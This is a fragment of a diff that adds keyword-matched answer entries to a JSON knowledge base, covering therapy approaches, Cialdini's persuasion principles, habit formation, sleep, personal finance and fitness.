+      "answer": "Post-traumatic growth (PTG): positive psychological changes after trauma \u2014 deeper relationships, new priorities, spiritual development, sense of personal strength, openness to possibilities. Tedeschi and Calhoun coined the term. Not inevitable; doesn't replace PTSD treatment when present; not 'looking on the bright side' (that's avoidance). Often emerges months/years later, through deliberate processing rather than positive thinking alone."
+    },
+    {
+      "keywords": [
+        "meaning making",
+        "meaning in life",
+        "viktor frankl"
+      ],
+      "answer": "Meaning-making: humans need a sense of meaning, more than pleasure alone. Sources: relationships, work that contributes, transcendent beliefs, suffering-with-purpose. Lacking meaning correlates with depression and 'crisis of meaning'. Viktor Frankl's 'Man's Search for Meaning' (Holocaust survivor) is the seminal text \u2014 even in extreme suffering, humans seek and find meaning. Modern: Acceptance and Commitment Therapy uses values clarification."
+    },
+    {
+      "keywords": [
+        "logotherapy",
+        "frankl logotherapy",
+        "frankl"
+      ],
+      "answer": "Logotherapy (Viktor Frankl): meaning-focused psychotherapy. Three pathways to meaning: creating a work or doing a deed, experiencing something or someone (love, beauty), the attitude we take toward unavoidable suffering. Frankl developed his ideas before and tested them during the Holocaust \u2014 survived Auschwitz, lost most of his family. 'Between stimulus and response there is a space. In that space is our power to choose.'"
+    },
+    {
+      "keywords": [
+        "acceptance commitment therapy",
+        "act therapy",
+        "act"
+      ],
+      "answer": "Acceptance and Commitment Therapy (ACT): third-wave CBT. Six processes: cognitive defusion (notice thoughts as thoughts, not literal truth), acceptance (allow uncomfortable feelings), present moment awareness, self-as-context (broader sense of self), values clarification, committed action (behavior aligned with values). Strong evidence base. Differs from classical CBT by not aiming to change thought content \u2014 just relationship to thoughts."
+    },
+    {
+      "keywords": [
+        "dialectical behavior therapy",
+        "dbt",
+        "dbt skills"
+      ],
+      "answer": "Dialectical Behavior Therapy (DBT, Marsha Linehan): originally for borderline personality disorder, now broader. Four skill modules: mindfulness, distress tolerance (radical acceptance, TIP skills for crisis), emotion regulation, interpersonal effectiveness (DEAR MAN). Combines acceptance (validating current reality) with change (skills to do something different). Evidence for: BPD, self-harm, suicidality, substance use, eating disorders."
+    },
+    {
+      "keywords": [
+        "emdr therapy",
+        "emdr",
+        "eye movement therapy"
+      ],
+      "answer": "EMDR (Eye Movement Desensitization and Reprocessing): trauma therapy. Client recalls traumatic memory while doing bilateral stimulation (eye movements, taps, sounds). Mechanism debated \u2014 bilateral stim may not be necessary; exposure + integration may be the active ingredient. Evidence: comparable to trauma-focused CBT for PTSD. Trained therapists only; not a magic cure."
+    },
+    {
+      "keywords": [
+        "somatic therapy",
+        "body therapy",
+        "somatic experiencing"
+      ],
+      "answer": "Somatic therapies: work with the body's sensations as a route to processing trauma. Approaches: Somatic Experiencing (Peter Levine \u2014 completing thwarted survival responses), Sensorimotor Psychotherapy (Pat Ogden), Hakomi. Premise: trauma is held in the nervous system, not just memory. Techniques: tracking sensations, titration (small doses), pendulation (oscillate between regulation and activation). Growing evidence base; complements talk therapy."
+    },
+    {
+      "keywords": [
+        "polyvagal theory",
+        "stephen porges",
+        "vagus nerve"
+      ],
+      "answer": "Polyvagal theory (Stephen Porges): nervous system has hierarchical states \u2014 ventral vagal (safe, social), sympathetic (fight/flight), dorsal vagal (freeze/collapse). Cues of safety vs danger trigger state shifts. Has influenced trauma therapy widely (especially somatic). Scientifically: details are debated; some claims oversold. The clinical framing (felt sense of safety matters) is broadly useful even if the specific anatomical model is incomplete."
+    },
+    {
+      "keywords": [
+        "adult attachment",
+        "attachment in adults",
+        "attachment styles"
+      ],
+      "answer": "Adult attachment styles (Bartholomew, Hazan & Shaver): secure (~50%), anxious-preoccupied (worries about abandonment, seeks reassurance), dismissive-avoidant (suppresses needs, values independence), fearful-avoidant (wants closeness but fears it). Roots in childhood with caregivers. Earned secure: can develop through corrective relationships and therapy. Patterns most visible under relationship stress."
+    },
+    {
+      "keywords": [
+        "codependency",
+        "codependent",
+        "codependent relationship"
+      ],
+      "answer": "Codependency: pattern of placing others' needs above your own, deriving identity from caretaking, struggle with boundaries. Often roots in chaotic childhood (parental addiction, abuse, neglect). Symptoms: hypervigilance to others' moods, resentment, exhaustion, difficulty knowing own wants. Recovery: 12-step (CoDA), therapy, boundary work, self-knowledge. Critiqued for over-pathologizing normal caring behaviors \u2014 context matters."
+    },
+    {
+      "keywords": [
+        "narcissistic abuse",
+        "narc abuse",
+        "narcissist recovery"
+      ],
+      "answer": "Narcissistic abuse recovery: leaving relationships with people high in narcissistic traits or NPD. Tactics victims often experienced: gaslighting, love-bombing then devaluation, smear campaigns. Recovery: no/low contact, rebuild support network, professional therapy (trauma-informed), educate yourself but don't get stuck in 'narc content' rumination. Caution: 'narcissist' is overused online \u2014 saved for genuine pattern, not normal jerks."
+    },
+    {
+      "keywords": [
+        "gaslighting",
+        "gaslight",
+        "reality manipulation"
+      ],
+      "answer": "Gaslighting: persistent denial of someone's reality to make them doubt their perceptions, memory, or judgment. Examples: 'that never happened', 'you're remembering it wrong', 'you're being too sensitive'. Effect: erodes confidence, increases dependency on abuser. Counter: outside witnesses, journaling (dated, factual), professional support. Distinguish from ordinary disagreement \u2014 gaslighting is patterned and demoralizing."
+    },
+    {
+      "keywords": [
+        "emotional manipulation",
+        "manipulation tactics",
+        "manipulator"
+      ],
+      "answer": "Common emotional manipulation tactics: guilt-tripping ('after all I've done for you'), DARVO (deny, attack, reverse victim and offender), silent treatment, intermittent reinforcement, triangulation (involving third parties), playing the victim, moving goalposts. Recognizing the pattern helps \u2014 manipulators rely on you not naming the move. Counter: clear boundaries, not justifying every choice, removing yourself from the dynamic."
+    },
+    {
+      "keywords": [
+        "cult psychology",
+        "cult tactics",
+        "high control group"
+      ],
+      "answer": "Cult psychology: high-control groups exploit normal social and psychological mechanisms (commitment escalation, social proof, isolation from outside influence). Lifton's 8 criteria: milieu control, mystical manipulation, demand for purity, confession, sacred science, loaded language, doctrine over person, dispensing of existence. Not just 'religious cults' \u2014 political, MLM, therapy, fitness groups can be cultic. Recovery: BITE model awareness, exit counseling."
+    },
+    {
+      "keywords": [
+        "groupthink",
+        "group think",
+        "janis groupthink"
+      ],
+      "answer": "Groupthink (Irving Janis): cohesive groups suppress dissent, leading to bad decisions. Symptoms: illusion of invulnerability, collective rationalization, stereotyping outsiders, self-censorship, illusion of unanimity, mindguards (block dissent). Examples: Bay of Pigs, Challenger disaster. Counter: assign devil's advocate, anonymous input first, leader withholds opinion until others share, post-mortems."
+    },
+    {
+      "keywords": [
+        "bystander effect",
+        "kitty genovese",
+        "bystander"
+      ],
+      "answer": "Bystander effect: people are less likely to help when others are present \u2014 responsibility diffuses, social proof tells them 'no one else is reacting, must be fine.' Famous case (Kitty Genovese, 1964) often distorted in retelling but the phenomenon is real. Counter as a victim: address a specific person ('you in the red jacket, call 911'). Counter as a witness: act first, signal others."
+    },
+    {
+      "keywords": [
+        "diffusion responsibility",
+        "responsibility diffusion"
+      ],
+      "answer": "Diffusion of responsibility: in groups, each person assumes someone else will act. Magnifies bystander effect. Also seen in: code 'someone else will document this', open-source 'someone else will fix the bug'. Counter: explicit ownership, RACI/DRI roles, default-to-action norms."
+    },
+    {
+      "keywords": [
+        "social proof",
+        "social proof principle"
+      ],
+      "answer": "Social proof (Cialdini): we look to others' behavior to guide our own, especially under uncertainty or in ambiguous situations. Used by marketers (testimonials, 'most popular'), by designers (showing usage stats), unconsciously by everyone (laughter is contagious). Can backfire when 'descriptive norm' (what people do) and 'injunctive norm' (what they should do) conflict ('don't litter, but here's how much litter is here')."
+    },
+    {
+      "keywords": [
+        "scarcity principle",
+        "scarcity",
+        "fomo marketing"
+      ],
+      "answer": "Scarcity principle (Cialdini): things less available feel more valuable. 'Only 3 left in stock', 'limited time', 'invite only'. Genuine scarcity is honest; manufactured scarcity is manipulative. Resist by asking: would I want this if it were freely available? Particularly powerful when combined with loss aversion."
+    },
+    {
+      "keywords": [
+        "reciprocity principle",
+        "reciprocity",
+        "favor exchange"
+      ],
+      "answer": "Reciprocity (Cialdini): we feel obligated to return favors, even unsolicited ones. Free samples, gifts from salespeople, even just a small kindness. Roots: cross-cultural and ancient \u2014 reciprocity stabilizes cooperation. Exploited by: timeshare presentations, fundraising mailers with 'free' address labels. Healthy reciprocity is the foundation of trust; one-sided exchange or false generosity is the manipulation."
+    },
+    {
+      "keywords": [
+        "authority bias",
+        "authority",
+        "milgram"
+      ],
+      "answer": "Authority bias (Cialdini): we defer to perceived authority \u2014 titles, uniforms, confident demeanor. Milgram's experiments showed how far it can go (compliance with harming others on authority figure's instruction). Healthy in domains where expertise matters; dangerous when authority is illegitimate or wrong. Ask: does this person actually know? Does evidence support their claim?"
+    },
+    {
+      "keywords": [
+        "commitment consistency",
+        "cialdini commitment",
+        "foot in the door"
+      ],
+      "answer": "Commitment and consistency (Cialdini): once we commit (especially publicly, in writing, voluntarily), we feel pressure to act consistently with that commitment. Used by: get-small-yes-then-big-ask ('foot in the door'), public goal-setting (gym sign-ups), petition-then-donation. Healthy version: identity-based habits, public accountability. Unhealthy: sunk-cost escalation, defending positions past evidence."
+    },
+    {
+      "keywords": [
+        "liking principle",
+        "liking",
+        "like influence"
+      ],
+      "answer": "Liking (Cialdini): we're more easily influenced by people we like. Liking factors: similarity, compliments, cooperation, attractiveness, familiarity. Sales training leans heavily on this. Counter: separate the message from the messenger when evaluating offers ('would I want this if a stranger were selling it?'). Healthy use: be likable in genuine ways; relationships matter."
+    },
+    {
+      "keywords": [
+        "unity principle",
+        "cialdini unity",
+        "shared identity"
+      ],
+      "answer": "Unity (Cialdini, added in 2016): identification with a 'we' \u2014 family, nationality, sports team, religion, fandom. Stronger than mere liking. 'We're in this together' is mobilizing \u2014 for cooperation OR division. Brands leverage this (Apple users, sneakerheads). Politicians and movements use it. Healthy: genuine community. Unhealthy: tribalism that ignores facts in favor of in-group loyalty."
+    },
+    {
+      "keywords": [
+        "dark patterns",
+        "dark ux",
+        "manipulative ux"
+      ],
+      "answer": "Dark patterns: UX designed to trick users against their interest. Examples: confirmshaming ('No thanks, I don't want to save money'), roach motel (easy to subscribe, hard to cancel), trick questions, hidden costs at checkout, sneak-into-basket, forced continuity. Site darkpatterns.org catalogs them. Increasingly regulated (FTC, EU). Ethical product builders avoid them \u2014 and they tend to backfire long-term (trust erosion)."
+    },
+    {
+      "keywords": [
+        "persuasive technology",
+        "behavior design",
+        "captology"
+      ],
+      "answer": "Persuasive technology (BJ Fogg, Stanford): designing products to influence behavior. Fogg Behavior Model: B = MAT (Motivation \u00d7 Ability \u00d7 Trigger). To get behavior, increase one or more. Ethically used: helping users meet their own goals (fitness apps, habit trackers). Unethically: addiction loops in social media, gambling apps. Fogg has expressed regret about some applications."
+    },
+    {
+      "keywords": [
+        "attention economy",
+        "attention market",
+        "content attention"
+      ],
+      "answer": "Attention economy: human attention is the scarce resource that media/tech companies sell to advertisers (or use to drive engagement metrics). Drives engagement-optimized content (outrage > nuance), notifications, infinite feeds, autoplay. Costs: shorter attention spans, anxiety, polarization. Counter (personal): notification audits, single-tasking, paid subscriptions over ad-supported. Counter (systemic): regulation, alternative business models."
+    },
+    {
+      "keywords": [
+        "dopamine loop",
+        "dopamine loops",
+        "variable reward"
+      ],
+      "answer": "Dopamine loops: dopamine isn't 'pleasure' \u2014 it's anticipation/seeking. Variable rewards (sometimes you get a like, sometimes you don't, intermittently rewarded) maximize dopamine response \u2014 same as slot machines. Used in social media, games, dating apps. Result: compulsive checking even when the rewards are small. Counter: insert friction, log out, set time limits, replace with deliberate slow rewards (reading, exercise)."
+    },
+    {
+      "keywords": [
+        "variable reward schedule",
+        "intermittent reinforcement",
+        "skinner box"
+      ],
+      "answer": "Variable reward schedule (Skinner): rewards delivered unpredictably produce the most persistent behavior \u2014 animals (and humans) keep checking long after rewards stop. Why slot machines, social media notifications, fishing, gambling are so 'sticky'. The unpredictability matters more than reward size. Designers know this \u2014 knowing it back lets you opt out of the cage."
+    },
+    {
+      "keywords": [
+        "social comparison",
+        "comparison theory",
+        "social compare"
+      ],
+      "answer": "Social comparison theory (Festinger): we evaluate ourselves by comparing to others, upward (worse for self-esteem) or downward (boosts mood). Social media skews toward upward comparison \u2014 others' highlight reels vs our behind-the-scenes. Reduces well-being. Counter: curate feeds (mute envy triggers), 'compare-to-past-self' framing, limit scrolling, real-life relationships with people whose unvarnished lives you see."
+    },
+    {
+      "keywords": [
+        "fomo",
+        "fear of missing out",
+        "fomo science"
+      ],
+      "answer": "FOMO (Fear Of Missing Out): anxiety that others are having rewarding experiences without you. Amplified by social media. Linked to worse sleep, attention, mood. Counter: 'JOMO' (joy of missing out), gratitude for what you're doing, intentional disconnection, embracing that you can't do everything. Realize: the highlights you see are filtered."
+    },
+    {
+      "keywords": [
+        "nomophobia",
+        "phone addiction",
+        "phone anxiety"
+      ],
+      "answer": "Nomophobia (no-mobile-phone phobia): anxiety from being without your phone or having a dead battery. Phenomenon real if name awkward. Reflects how tightly we've coupled essential functions (maps, payments, social) to phones. Healthy: brief disconnection (walks, meals, sleep without phone). If severe, suggests overreliance \u2014 practice intentional separations and have analog backups."
+    },
+    {
+      "keywords": [
+        "digital minimalism",
+        "newport",
+        "reduce screen time"
+      ],
+      "answer": "Digital minimalism (Cal Newport): intentional use of technology, only when it offers significant benefit aligned with values, in the way that maximizes that benefit. 30-day digital declutter: remove optional tech, evaluate, reintroduce deliberately. Replaces low-value scrolling with high-value activities (reading, hobbies, exercise, in-person socializing). Push back on 'always available' expectations."
+    },
+    {
+      "keywords": [
+        "deep work",
+        "cal newport deep work",
+        "focused work"
+      ],
+      "answer": "Deep work (Cal Newport): cognitively demanding, distraction-free work that creates value and is hard to replicate. Increasingly rare and increasingly valuable. Strategies: block specific hours, ritualize start (location, time, sequence), shut down completely after work, train concentration like a skill (start with 30 min, build), embrace boredom (don't fill every gap with phone). Output > hours."
+    },
+    {
+      "keywords": [
+        "single tasking",
+        "multitasking",
+        "attention switching"
+      ],
+      "answer": "Single-tasking vs multitasking: humans don't really multitask cognitively \u2014 they switch contexts, paying a switch cost each time. Heavy switchers perform worse on attention and memory tasks (Stanford research). Multitasking feels productive (busy) but produces less and shallower work. Practical: batch similar work, close other tabs/apps, full-screen, time-boxed sprints with single objective."
+    },
+    {
+      "keywords": [
+        "time perception",
+        "perception of time",
+        "time fast slow"
+      ],
+      "answer": "Time perception: subjective speed varies. Routine and predictable \u2192 time feels fast (years blur). Novelty, attention, learning \u2192 time feels slow in moment, but memorable in retrospect ('long week'). Aging: years feel faster because each is a smaller fraction of life lived and contains less novelty. Counter to time-flies feeling: deliberate novelty (new routes, new skills, travel), full presence."
+    },
+    {
+      "keywords": [
+        "procrastination science",
+        "procrastinate",
+        "stop procrastinating"
+      ],
+      "answer": "Procrastination: not laziness \u2014 emotional regulation failure. Task triggers discomfort (boredom, anxiety, self-doubt, perfectionism) \u2192 avoiding gives relief \u2192 reinforces avoidance. Fixes: identify the discomfort, reduce friction (smaller first step), implementation intention ('when X happens I'll do Y'), self-compassion (studies show it reduces, not increases, procrastination). Pomodoro can help, but the emotional piece matters most."
+    },
+    {
+      "keywords": [
+        "temptation bundling",
+        "temptation bundle",
+        "habit pairing"
+      ],
+      "answer": "Temptation bundling (Katy Milkman): pair an activity you SHOULD do with one you WANT to do. Only watch your favorite show while exercising. Only listen to that podcast on a commute. Couples the immediate reward of the want with the delayed benefit of the should. Evidence: significant adherence boost. Useful even outside formal experiments."
+    },
+    {
+      "keywords": [
+        "implementation intentions",
+        "if then plan",
+        "gollwitzer"
+      ],
+      "answer": "Implementation intentions (Peter Gollwitzer): pre-decide 'when X happens, I'll do Y'. Externalizes a decision into a situational cue. Example: 'When I sit down at my desk, I'll write for 25 minutes before email.' Doubles likelihood of follow-through in many studies. Combats decision fatigue and motivation dips."
+    },
+    {
+      "keywords": [
+        "if then planning",
+        "if-then plan",
+        "specific plan"
+      ],
+      "answer": "If-then planning: specific format for implementation intentions. The more specific the trigger (time, place, prior action), the better the activation. Compare 'I'll exercise more' vs 'After my morning coffee, I'll do 10 minutes of stretching in the living room.' Specificity beats motivation."
+    },
+    {
+      "keywords": [
+        "mental contrasting",
+        "mental contrast",
+        "oettingen"
+      ],
+      "answer": "Mental contrasting (Gabriele Oettingen): visualize the desired outcome AND the obstacles. Pure positive fantasy (just imagining success) reduces motivation \u2014 feels like you've achieved it. Mental contrasting (positive future + present obstacles) increases motivation when expectation of success is high; helpfully disengages when low. Foundation of WOOP."
+    },
+    {
+      "keywords": [
+        "woop method",
+        "woop",
+        "oettingen woop"
+      ],
+      "answer": "WOOP (Wish, Outcome, Obstacle, Plan, Oettingen): structured mental contrasting. Wish \u2014 something challenging but feasible. Outcome \u2014 best result, vividly imagined. Obstacle \u2014 internal one (not 'busy at work' but 'I'll feel tired'). Plan \u2014 implementation intention to overcome it. 5-10 min practice. Evidence in studies on academics, exercise, relationships."
+    },
+    {
+      "keywords": [
+        "habit stacking",
+        "habit stack",
+        "james clear"
+      ],
+      "answer": "Habit stacking (James Clear, Atomic Habits \u2014 credit to BJ Fogg's 'Tiny Habits'): tack a new habit onto an existing one. 'After I pour my morning coffee, I'll write one sentence in my journal.' Uses the existing habit as the trigger. Stack multiple small habits to build routines. Start tiny \u2014 consistency over intensity."
+    },
+    {
+      "keywords": [
+        "environment design habits",
+        "habit environment",
+        "design environment"
+      ],
+      "answer": "Environmental design for habits: shape your surroundings to make good habits easier and bad habits harder. Make cues obvious for what you want, invisible for what you don't. Examples: water bottle on desk (drink more), phone in another room (less scrolling), gym clothes laid out (workout), candy out of sight. Willpower is finite; environment compounds."
+    },
+    {
+      "keywords": [
+        "identity habits",
+        "identity based habits",
+        "atomic habits"
+      ],
+      "answer": "Identity-based habits (James Clear): change happens through identity, not goals. 'I want to run a marathon' (outcome) vs 'I'm a runner' (identity). Each small habit casts a vote for an identity. Ask 'who is the type of person who could do this?' and act as that person, even just slightly. Sustained change requires self-image change."
+    },
+    {
+      "keywords": [
+        "keystone habits",
+        "keystone habit",
+        "duhigg"
+      ],
+      "answer": "Keystone habits (Charles Duhigg, The Power of Habit): some habits trigger positive cascades across other areas. Exercise often is keystone \u2014 improves sleep, mood, eating, work focus. Family dinners. Daily bed-making. Identify yours \u2014 small effort, outsized leverage. Pick one keystone habit before sprawling habit lists."
+    },
+    {
+      "keywords": [
+        "habit tracking",
+        "habit tracker",
+        "track habits"
+      ],
+      "answer": "Habit tracking: marking completion daily builds streaks (motivating) and provides feedback. Tools: paper journal, Habitica, Streaks, Way of Life, Reflectly. 'Don't break the chain' (Seinfeld method) \u2014 visual streak creates motivation to continue. Avoid: tracking too many at once (5 max), letting metric become the goal (mark-fudging), shame spiral after breaking streak (treat as data, recommit)."
+    },
+    {
+      "keywords": [
+        "accountability partners",
+        "accountability partner",
+        "commitment partner"
+      ],
+      "answer": "Accountability partners: someone who checks in on your goals. More effective than going alone \u2014 public commitment + social cost of failing. Best: peer with their own goals (mutual), specific check-ins (weekly call), specific commitments (not vague 'work on book'). Coaches and therapists fill similar role but cost money. Online communities (Discords, subreddits) provide group accountability."
+    },
+    {
+      "keywords": [
+        "coaching vs mentoring",
+        "coach mentor",
+        "coaching mentoring"
+      ],
+      "answer": "Coaching vs mentoring: Coaching \u2014 structured, often professional, asks powerful questions, client finds own answers (you have the answers, the coach helps you find them). Mentoring \u2014 usually informal, shares experience and advice ('here's what worked for me'). Both valuable. Coaching better for clarity in transitions; mentoring better for domain-specific apprenticeship. Don't confuse with therapy (mental health) or consulting (delivering solutions)."
+    },
+    {
+      "keywords": [
+        "feedback loops",
+        "feedback loop",
+        "tight feedback"
+      ],
+      "answer": "Feedback loops: cycles where output influences input. Tight loops (immediate, accurate) enable rapid learning. Examples: video games (constant feedback \u2192 fast skill growth), test-driven development (test fail/pass), Duolingo (immediate correct/incorrect). Loose loops (delayed, noisy) hide cause-effect. Improve learning by tightening loops: more granular metrics, faster cycles, paired observation."
+    },
+    {
+      "keywords": [
+        "deliberate rest",
+        "strategic rest",
+        "alex pang"
+      ],
+      "answer": "Deliberate rest (Alex Soojung-Kim Pang): real rest is active and intentional, not passive collapse. Habits: long walks, naps, hobbies that absorb you, sabbaticals. Counterintuitive: top performers rest more, not less. Brain processes problems during rest (default mode network). Burnout often = absent strategic rest plus chronic mild overwork."
+    },
+    {
+      "keywords": [
+        "ultradian rhythm",
+        "ultradian",
+        "work rest cycle"
+      ],
+      "answer": "Ultradian rhythms: ~90-minute cycles of higher then lower arousal/focus throughout the day. Working with them (90-min focus then 15-20 min rest) sustains performance; working through dips with caffeine eventually crashes you. Watch your own patterns \u2014 signals are often clear (yawning, restlessness, blurred attention). Schedule cognitive work in your peak windows; admin in valleys."
+    },
+    {
+      "keywords": [
+        "chronotype",
+        "morning evening person",
+        "chronotype types"
+      ],
+      "answer": "Chronotype: your natural sleep/wake preference. Morning lark, night owl, intermediate. Largely genetic. Forcing against it (owls in 9-5 jobs) creates 'social jet lag' \u2014 chronic mild fatigue, worse health markers. Adjust where possible: shift work hours, schedule cognitive work in your peak window, light exposure in morning to gently advance. Severe owl shifts may indicate Delayed Sleep Phase Disorder."
+    },
+    {
+      "keywords": [
+        "social jet lag",
+        "misalignment sleep",
+        "weekend recovery"
+      ],
+      "answer": "Social jet lag: difference between your biological clock and social schedule (work, school). Manifests as needing to sleep in on weekends. Even 1-2 hours of social jet lag correlates with worse cardiovascular health, mood, weight management. Reduce: consistent wake time even on weekends, more morning light, less evening light, adjust schedule toward chronotype."
+    },
+    {
+      "keywords": [
+        "light exposure sleep",
+        "light sleep",
+        "melatonin"
+      ],
+      "answer": "Light and sleep: morning sunlight (especially within 30 min of waking) anchors circadian rhythm, advances sleep timing, improves mood (Andrew Huberman popularized this). Evening light (especially blue) delays melatonin release and pushes sleep later. Practical: 10-15 min outdoor light in morning (not through window), dim lights 2 hours before bed, blackout curtains for sleep."
+    },
+    {
+      "keywords": [
+        "temperature sleep",
+        "cool room sleep",
+        "sleep temp"
+      ],
+      "answer": "Temperature and sleep: body core temp drops to initiate and maintain sleep. Cool bedroom (~65\u00b0F / 18\u00b0C) helps. Warm bath/shower 1-2 hours before bed paradoxically helps \u2014 peripheral blood flow increases then core temp drops as you cool off. Hot environments (especially humid) crater sleep quality. Cooling mattresses/pads if your partner runs hot."
+    },
+    {
+      "keywords": [
+        "napping science",
+        "power nap",
+        "nap research"
+      ],
+      "answer": "Napping: 10-20 min power naps boost alertness without sleep inertia. 60-90 min naps include slow-wave + REM but risk grogginess if mistimed. Avoid naps within 6-8 hours of bedtime if you have insomnia. Caffeine nap: drink coffee, nap 20 min \u2014 caffeine kicks in as you wake. NASA-studied with pilots. Cultural: many countries have siestas; modern work mostly doesn't accommodate them, but it should."
+    },
+    {
+      "keywords": [
+        "polyphasic sleep",
+        "uberman",
+        "polyphasic"
+      ],
+      "answer": "Polyphasic sleep: sleep distributed in multiple short blocks (Uberman: 6 naps of 20 min, ~2 hr total). Anecdotal claims of feeling rested on less. Reality: tiny sample, no strong evidence, sustained polyphasic almost universally fails. Common reverted-to: biphasic (one main + one nap) closer to historical human pattern. For most people, prioritize 7-9 hours monophasic and consistent timing."
+    },
+    {
+      "keywords": [
+        "cap rate",
+        "capitalization rate",
+        "real estate cap"
+      ],
+      "answer": "Cap rate (capitalization rate): in real estate, annual net operating income \u00f7 property value. Higher cap rate = higher yield + typically higher risk or worse location. Used to compare investment properties. A property at $1M with $60K NOI = 6% cap rate. Compares with bond yields and other investments. Cap rates vary by city, asset class, and interest rate environment."
+    },
+    {
+      "keywords": [
+        "compound interest",
+        "compound growth",
+        "compounding"
+      ],
+      "answer": "Compound interest: interest on interest. $1000 at 7% for 10 years simple = $1700; compounded = $1967. Over 30 years: simple $3100; compound $7612. Einstein allegedly called it the 8th wonder of the world (probably apocryphal). Why early investing matters: time compounds returns more than amount. Same principle works against you with debt (credit cards)."
+    },
+    {
+      "keywords": [
+        "index funds",
+        "passive investing",
+        "etfs"
+      ],
+      "answer": "Index funds: hold the market (or a slice of it). Low fees (0.03-0.20% expense ratio). Match index returns minus fees. Beat ~90% of active funds over 10-year periods after fees. Bogle/Vanguard popularized for retail. Common: VOO (S&P 500), VTI (total US market), VXUS (international), BND (bonds). Strategy: buy regularly, hold long, rebalance once a year, ignore noise."
+    },
+    {
+      "keywords": [
+        "roth ira",
+        "roth",
+        "traditional ira"
+      ],
+      "answer": "Roth IRA (US): contributions taxed now, withdrawals (after 59\u00bd + 5 yr rule) tax-free. Traditional IRA: tax deduction now, taxed on withdrawal. Roth wins if you expect higher tax rate later. 2025 limits: ~$7,000/year ($8,000 if 50+). Income limits for direct contribution; 'backdoor Roth' workaround for high earners. Roth 401(k) similar concept for employer plans."
+    },
+    {
+      "keywords": [
+        "emergency fund",
+        "savings buffer",
+        "emergency savings"
+      ],
+      "answer": "Emergency fund: 3-6 months of essential expenses in liquid savings. Purpose: handle job loss, medical, car/home emergency without going into debt or selling investments at the wrong time. Where: high-yield savings account (HYSA), money market. Build first, before investing. After: invest the rest. Tiered: 1 month immediate, 3-6 month wider buffer."
+    },
+    {
+      "keywords": [
+        "dollar cost averaging",
+        "dca",
+        "cost averaging"
+      ],
+      "answer": "Dollar-cost averaging (DCA): invest fixed amount on schedule regardless of price. Buys more shares when price is low, fewer when high. Reduces timing risk and emotional decisions. Compare to lump-sum: research shows lump-sum often outperforms DCA on average (markets trend up) \u2014 but DCA reduces regret risk if you bought right before a crash. Most retirement contributions are automatic DCA."
+    },
+    {
+      "keywords": [
+        "breathwork",
+        "breathing exercises",
+        "wim hof"
+      ],
+      "answer": "Breathwork: intentional breathing patterns to shift state. Box breathing (4-4-4-4) \u2014 calm under stress, used by Navy SEALs. 4-7-8 (Andrew Weil) \u2014 sleep. Physiological sigh (two inhales through nose, long exhale) \u2014 fastest evidence-based stress reduction (Huberman). Wim Hof method (30 fast breaths + retention) \u2014 strong subjective effects, do seated, never in water (blackouts cause drowning deaths)."
+    },
+    {
+      "keywords": [
+        "cold exposure",
+        "cold plunge",
+        "ice bath"
+      ],
+      "answer": "Cold exposure: cold showers, ice baths, cold plunges. Claimed benefits: mood (norepinephrine, dopamine), inflammation reduction, brown fat activation, mental toughness. Most studied: dopamine increase from 1-3 min of true cold exposure. Don't do it RIGHT after lifting if hypertrophy is the goal (blunts adaptation). Start small \u2014 cold shower at end of regular one."
+    },
+    {
+      "keywords": [
+        "sauna benefits",
+        "sauna heat",
+        "heat exposure"
+      ],
+      "answer": "Sauna: heat exposure (typically 70-100\u00b0C / 160-210\u00b0F). Evidence-based benefits: cardiovascular (Finnish studies, sauna users have lower all-cause mortality dose-dependently), heat shock proteins, relaxation, mild improvements in pain/recovery. Hydration matters. Contraindications: pregnancy (caution), low blood pressure, heart disease (talk to doctor). 15-30 min sessions, 2-4x/week."
+    },
+    {
+      "keywords": [
+        "intermittent fasting",
+        "if fasting",
+        "fasting eating window"
+      ],
+      "answer": "Intermittent fasting (IF): time-restricted eating. Common: 16:8 (eat in 8-hour window), 18:6, 14:10 (gentler), OMAD (one meal a day). Evidence: modest weight loss vs traditional caloric restriction; metabolic markers improve in some studies but no clear advantage if calories matched. Easier adherence for many (skip breakfast, simple). Not for: those with eating disorder history, pregnancy, intense athletes."
+    },
+    {
+      "keywords": [
+        "protein intake",
+        "daily protein",
+        "how much protein"
+      ],
+      "answer": "Protein intake: RDA (~0.8 g/kg) is bare minimum. Active people: 1.4-2.0 g/kg, strength trainees toward upper end. Older adults benefit from upper end to fight sarcopenia. Distribution: aim for 0.3 g/kg per meal (leucine threshold) \u2014 30-50g protein per meal for most adults. Sources: meat, fish, eggs, dairy, legumes + grains together, soy, whey/casein. Concerns about kidneys overstated for healthy people."
+    },
+    {
+      "keywords": [
+        "zone 2 cardio",
+        "zone 2",
+        "aerobic training"
+      ],
+      "answer": "Zone 2 cardio: low-intensity aerobic work where you can hold a conversation, ~60-70% max HR. Builds mitochondria, improves fat oxidation, expands aerobic base. Polarized training (80% Z2, 20% high intensity) outperforms moderate-only. Practical: 150-180 min/week. Walking with intent, easy cycling, easy jog. Most enduring health-span advice. Peter Attia and Inigo San Millan popularized in longevity circles."
+    },
+    {
+      "keywords": [
+        "sleep hygiene",
+        "sleep tips",
+        "better sleep"
+      ],
+      "answer": "Sleep hygiene: consistent sleep/wake time (especially wake), morning light, no caffeine after ~2pm (half-life 5-7h), cool dark bedroom, no alcohol close to bed (fragmented sleep, no REM), reduce evening light/screens, exercise (not late evening for some), wind-down routine. Bed for sleep + sex only. If can't sleep 20 min, get up and do something boring. Magnesium glycinate helps some."
+    },
+    {
+      "keywords": [
+        "circadian rhythm",
+        "body clock",
+        "circadian"
+      ],
+      "answer": "Circadian rhythm: ~24-hour biological clock. Suprachiasmatic nucleus (SCN) in brain syncs to light. Hormones (cortisol high AM, melatonin in evening), body temp (drops at night), digestion all follow circadian patterns. Disruption (shift work, jet lag, late screens): worse health markers. Reinforce: morning light, regular meals, dim evenings, regular bedtime."
+    },
+    {
+      "keywords": [
+        "happiness science",
+        "positive emotions",
+        "what makes happy"
+      ],
+      "answer": "Happiness research: hedonic (pleasure) vs eudaimonic (meaning) well-being. Adaptation (hedonic treadmill) \u2014 most circumstances revert to baseline. What sustainably moves the needle: strong relationships, sense of purpose, engagement (flow), physical health, regular gratitude, helping others, autonomy in daily life. Money matters up to needs covered + some buffer; after that, much less than people predict."
+    },
+    {
+      "keywords": [
+        "harvard study adult development",
+        "relationships happiness",
+        "grant study"
+      ],
+      "answer": "Harvard Study of Adult Development (1938-, longest longitudinal study of life): clearest predictor of late-life satisfaction and health = warm relationships. Not wealth, fame, or career. 'Loneliness kills' \u2014 comparable to smoking 15 cigarettes/day in mortality. Active investment in relationships (texting, calls, time spent) correlates with thriving. George Vaillant and Robert Waldinger have written about findings."
+    },
+    {
+      "keywords": [
